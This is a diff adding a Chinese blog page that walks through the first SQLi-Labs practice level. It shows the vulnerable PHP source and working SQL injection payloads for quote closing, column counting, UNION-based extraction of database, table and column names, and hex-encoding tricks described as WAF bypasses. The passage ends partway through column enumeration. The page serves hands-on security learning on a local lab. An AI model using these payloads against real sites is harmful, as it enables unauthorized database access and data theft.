@@ -1,0 +1,1341 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.cat.net//css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="国光,SQL," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="国光" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="http://image.3001.net/images/20171012/15077801618158.png?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="发现以前对手工注入理解的很不透彻，最近准备来系统的学习下手工注入，所以本地搭建了SQLi-Labs环境来练习。做个记录，供日后自己复习查看。">
+<meta name="keywords" content="国光,SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-LABS 系列 第1到4关">
+<meta property="og:url" content="http://www.sqlsec.com/2017/12/sqlilabs1.html">
+<meta property="og:site_name" content="国光">
+<meta property="og:description" content="发现以前对手工注入理解的很不透彻，最近准备来系统的学习下手工注入，所以本地搭建了SQLi-Labs环境来练习。做个记录，供日后自己复习查看。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://image.3001.net/images/20171220/15137709982478.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/15136722563670.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/15136723803781.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/1513673951752.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/1513674042848.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/15136741282210.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/15136746034612.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/15136752142545.png">
+<meta property="og:image" content="http://image.3001.net/images/20171220/1513734385351.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/15136865336518.png">
+<meta property="og:image" content="http://image.3001.net/images/20171219/15136881242856.png">
+<meta property="og:image" content="http://image.3001.net/images/20171220/15137354242398.png">
+<meta property="og:image" content="http://image.3001.net/images/20171220/15137365975139.png">
+<meta property="og:updated_time" content="2017-12-20T11:57:01.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi-LABS 系列 第1到4关">
+<meta name="twitter:description" content="发现以前对手工注入理解的很不透彻，最近准备来系统的学习下手工注入，所以本地搭建了SQLi-Labs环境来练习。做个记录，供日后自己复习查看。">
+<meta name="twitter:image" content="http://image.3001.net/images/20171220/15137709982478.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.sqlsec.com/2017/12/sqlilabs1.html"/>
+
+
+
+
+
+  <title>SQLi-LABS 系列 第1到4关 | 国光</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">国光</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">安安静静写博客</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-hacker">
+          <a href="/categories/hacker/" rel="section">
+            
+            黑客
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-c">
+          <a href="/C" rel="section">
+            
+            C
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-android">
+          <a href="/categories/Android" rel="section">
+            
+            Android
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-python">
+          <a href="/categories/Python" rel="section">
+            
+            Python
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-ctf">
+          <a href="/categories/CTF" rel="section">
+            
+            CTF
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/Reverse" rel="section">
+            
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-others">
+          <a href="/categories/others/" rel="section">
+            
+            其他
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/categories/life" rel="section">
+            
+            生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-member">
+          <a href="/member" rel="section">
+            
+            作者墙
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://www.sqlsec.com/2017/12/sqlilabs1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="国光">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://image.3001.net/images/20170929/15066688735308.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="国光">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLi-LABS 系列 第1到4关</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-20T00:00:00+08:00">
+                2017-12-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/hacker/" itemprop="url" rel="index">
+                    <span itemprop="name">hacker</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye">浏览数</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="http://image.3001.net/images/20171220/15137709982478.png" alt="sqlinjection"><br>发现以前对手工注入理解的很不透彻，最近准备来系统的学习下手工注入，所以本地搭建了SQLi-Labs环境来练习。做个记录，供日后自己复习查看。<br><a id="more"></a></p>
+<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET - 基于错误 - 单引号 - 字符型</div><div class="line">GET - Error based - Single quotes - String</div></pre></td></tr></table></figure>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="尝试id值"><a href="#尝试id值" class="headerlink" title="尝试id值"></a>尝试id值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=1</div><div class="line">index.php?id=2</div><div class="line">页面返回正常，内容随着id的变化而变化</div></pre></td></tr></table></figure>
+<p><strong>猜测SQL语句为</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="keyword">input</span></div></pre></td></tr></table></figure></p>
+<h3 id="and尝试"><a href="#and尝试" class="headerlink" title="and尝试"></a>and尝试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">index.php?id=1 and 1=1 返回正常</div><div class="line">index.php?id=2 and 1=2 返回正常</div></pre></td></tr></table></figure>
+<p>这里返回都正常，说明上面推测的<code>SQL</code>语句是有问题的。</p>
+<h3 id="单引号测试"><a href="#单引号测试" class="headerlink" title="单引号测试"></a>单引号测试</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=1'</div><div class="line">得到报错信息:</div><div class="line">MySQL server version for the right syntax to <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></div></pre></td></tr></table></figure>
+<h3 id="斜杠测试"><a href="#斜杠测试" class="headerlink" title="斜杠测试"></a>斜杠测试</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=1\</div><div class="line">得到报错信息:</div><div class="line">MySQL server version for the right syntax to <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span>\<span class="string">' LIMIT 0,1'</span> <span class="keyword">at</span> line <span class="number">1</span></div></pre></td></tr></table></figure>
+<h3 id="推理"><a href="#推理" class="headerlink" title="推理"></a>推理</h3><p>报错最外面的<code>单引号</code>是程序用来标注错误的<code>单引号</code>，然后如下区分:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">near '   '1'' LIMIT 0,1  ' at line 1</div><div class="line">near '   '1\' LIMIT 0,1  ' at line 1</div></pre></td></tr></table></figure></p>
+<p>这里面外面输出的为:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">'1'' LIMIT 0,1</div><div class="line">'1\' LIMIT 0,1</div></pre></td></tr></table></figure></p>
+<p>说明源码中的<code>SQL</code>的语句里，<code>id</code>应该是有<code>单引号</code>去标注的。<br><strong>再次猜测SQL语句为</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'input'</span></div></pre></td></tr></table></figure></p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>($row)</div><div class="line">	&#123;</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</div><div class="line">  	&#125;</div><div class="line">	<span class="keyword">else</span> </div><div class="line">	&#123;</div><div class="line">	print_r(mysql_error());</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>输入的攻击代码输入后，代入<code>SQL</code>语句查询后如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'input 攻击代码'</span></div></pre></td></tr></table></figure></p>
+<p>攻击代码的要求:</p>
+<ul>
+<li>语句是正确的(正确的去闭合SQL语句)</li>
+<li>可以获取到敏感信息</li>
+</ul>
+<h3 id="引号闭合"><a href="#引号闭合" class="headerlink" title="引号闭合"></a>引号闭合</h3><p>先闭合单引号，保证不会出现语法错误。<code>payload</code>如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id =1 ' and '1' ='1</div></pre></td></tr></table></figure></p>
+<p>代入<code>SQL</code>语句中为:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'1'</span> =<span class="string">'1'</span></div></pre></td></tr></table></figure></p>
+<p>发现单引号的确都完美的闭合了，理论上来说，不会再出现语法错误了。</p>
+<p>###通过注释<br><code>MySQL</code>语句中的注释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-- 这里就是被注释的语句（注意--后面是有一个空格的）</div></pre></td></tr></table></figure></p>
+<p>一般我们用<code>+</code>去替换空格，避免我们遗漏，然后构造的<code>payload</code>如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id =1 ' and 1=1 <span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>代入<code>SQL</code>语句中为:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">--+‘</span></div></pre></td></tr></table></figure></p>
+<p>最后面的<code>单引号</code>被注释了，前面的单引号闭合是正确的，这里只要保证了前面的<code>单引号</code>是正确的，就可以执行<code>SQL</code>注入语句。</p>
+<h2 id="验证注入"><a href="#验证注入" class="headerlink" title="验证注入"></a>验证注入</h2><p>既然已经构造好了2种<code>payload</code>，那么就去验证注入是否存在吧。</p>
+<h3 id="闭合引号"><a href="#闭合引号" class="headerlink" title="闭合引号"></a>闭合引号</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=1' and '1' ='1  </div><div class="line">**实际测试中，未来防止我们漏掉空格，建议用`+`来替代空格**</div><div class="line">index.php?id=1'+and+'1'+='1</div></pre></td></tr></table></figure>
+<p>页面返回情况:<br><img src="http://image.3001.net/images/20171219/15136722563670.png" alt=""><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=1'+and+'1'+='2</div></pre></td></tr></table></figure></p>
+<p>页面返回情况:<br><img src="http://image.3001.net/images/20171219/15136723803781.png" alt=""><br>由于2次页面返回的结果不同，这里验证了<code>SQL</code>注入的存在</p>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>首先<code>and 1=1</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=1'+and+1=1<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>然后<code>and 1=2</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=1'+and+1=2<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>2次页面返回的结果也不同，这里也验证了<code>SQL</code>注入的存在</p>
+<h2 id="实战拓展"><a href="#实战拓展" class="headerlink" title="实战拓展"></a>实战拓展</h2><p>验证完存在注入当然不能满足我们的需求，这里下面介绍一些实战中常用到的<code>SQL</code>注入姿势。</p>
+<h3 id="猜测字段数目"><a href="#猜测字段数目" class="headerlink" title="猜测字段数目"></a>猜测字段数目</h3><p>首先来猜测字段数目<br><code>order by 3</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=1'+order+by+3<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>页面返回正常<br><img src="http://image.3001.net/images/20171219/1513673951752.png" alt=""><br>然后<br><code>order by 4</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=1'+order+by+4<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>页面返回错误<br><img src="http://image.3001.net/images/20171219/1513674042848.png" alt=""><br>这里报错为<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Unknown column '4' in 'order clause'</div></pre></td></tr></table></figure></p>
+<p>说明这里并没有 4 个<code>column</code>，说明表的字段只有<code>3</code>个，我们来进数据库验证下:<br>果然表中只有<code>id</code>和<code>username</code>、<code>password</code>这<code>3</code>个字段<br><img src="http://image.3001.net/images/20171219/15136741282210.png" alt=""><br><strong>结论</strong><br>字段数为<code>3</code></p>
+<h3 id="union-select-联合查询对应的字段"><a href="#union-select-联合查询对应的字段" class="headerlink" title="union select 联合查询对应的字段"></a>union select 联合查询对应的字段</h3><p>首先要让网页返回错误的信息，这里面用<code>id=-1</code>来报错，也可以尝试使用<code>and 1=2</code>来报错。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1'+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>返回信息如下:<br><img src="http://image.3001.net/images/20171219/15136746034612.png" alt=""><br>这里面返回的错误信息如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Your Login name:2</div><div class="line">Your Password:3</div></pre></td></tr></table></figure></p>
+<p>说明 <code>Login name</code>后面的结果所查询的表字段对应的为<code>2</code>，<code>Password</code>后面的结果所查询的表字段对应的为<code>3</code><br>查看数据库的表结构，验证了我们的结果，字段<code>2</code>的列名为<code>username</code>，字段<code>3</code>的列名为<code>password</code></p>
+<h3 id="利用字段号收集信息"><a href="#利用字段号收集信息" class="headerlink" title="利用字段号收集信息"></a>利用字段号收集信息</h3><p>这里把报出的数字(字段号)，替换关键词，可以直接从数据库返回查询的结果<br>举个例子:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1'+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">user</span>(),<span class="keyword">database</span>()<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://image.3001.net/images/20171219/15136752142545.png" alt="">  </p>
+<p>常见的关键字变量如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">database()  查询当前数据库</div><div class="line">user()      查询数据库用户</div><div class="line">version()   查询数据库版本</div><div class="line">@@version   查询数据库版本</div><div class="line">@@basedir   MySQL安装基准目录</div><div class="line">@@datadir   数据库存储的地方</div><div class="line">@@have_openssl          如果mysqld支持客户端/服务器协议的SSL(加密)则为YES</div><div class="line">@@max_user_connections  MySQL账户允许的最大同时连接数,<span class="number">0</span>表示没限制</div><div class="line">@@version_compile_os    判断系统类型</div><div class="line">@@group_concat_max_len  允许group_concat()函数结果的最大长度</div><div class="line">@@log_error             错误日志的位置</div><div class="line">@@plugin_dir            插件目录的路径</div><div class="line">@@tmpdir                保存临时文件和临时表的目录</div></pre></td></tr></table></figure></p>
+<p><code>group_concat()</code>函数的利用如下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata</div></pre></td></tr></table></figure></p>
+<p>这样的话,就可以把当前用户中建立数据库名全部显示出来,在注射表名、字段名、字段属性都可以使用,这样的话又省了不少体力活</p>
+<p>同时<code>group_concat()</code>还可以绕过不能使用<code>limit</code>的现实,当然不嫌累的话,可以使用<code>&quot;!=&quot;</code>的形式来绕过<code>limit</code>的限制。</p>
+<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p>猜解表名的原理是利用MySQL中的<code>information_schema</code>表名中的tables的信息来查询的。<br><strong>方法一</strong><br>利用<code>group_concat(table_name)</code>来查询表名，<code>from information_schema.tables</code><br>这里<code>table_schema=database()</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1'+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="keyword">database</span>()+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p><strong>方法二</strong><br><code>table_schema=&#39;security&#39;</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1'+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="keyword">database</span>()+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="string">'security'</span><span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://image.3001.net/images/20171220/1513734385351.png" alt="">  </p>
+<p><strong>方法三</strong><br><code>table_schema=0x7365637572697479</code>这里的<code>0x7365637572697479</code>就是<code>security</code>的<code>hex</code>编码，听说编码多少都是可以 Bypass WAF的<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1'+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="keyword">database</span>()+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="number">0x7365637572697479</span><span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p><strong>方法四</strong><br>Bypass WAF技巧 使用<br><code>unhex(hex(group_concat(table_name)))</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1'+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">unhex</span>(<span class="keyword">hex</span>(<span class="keyword">group_concat</span>(table_name))),<span class="keyword">database</span>()+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://image.3001.net/images/20171219/15136865336518.png" alt="">  </p>
+<p><strong>方法五</strong><br>单个查询，不需要使用<code>GROUP_CONCAT</code>一起查询，使用 <code>limit 0,1</code>来逐步调整 逐条查询<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></div><div class="line">index.php?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='</span><span class="keyword">security</span><span class="string">' limit 1,1--+</span></div><div class="line"><span class="string">index.php?id=-1'</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span><span class="comment">--+</span></div><div class="line">index.php?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='</span><span class="keyword">security</span><span class="string">' limit 3,1--+</span></div></pre></td></tr></table></figure></p>
+<p><strong>拓展</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">group_concat(table_name separator &apos;:&apos;)</div></pre></td></tr></table></figure></p>
+<p>将结果以<code>:</code>进行隔开</p>
+<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>查询列名用到了<code>group_concat(column_name)</code>,然后<code>from information_schema.columns where table_name=hex编码后的表名</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1%27+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="keyword">database</span>()+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">'users'</span><span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>这里的<code>0x7573657273</code>是表名<code>users</code>的hex编码</p>
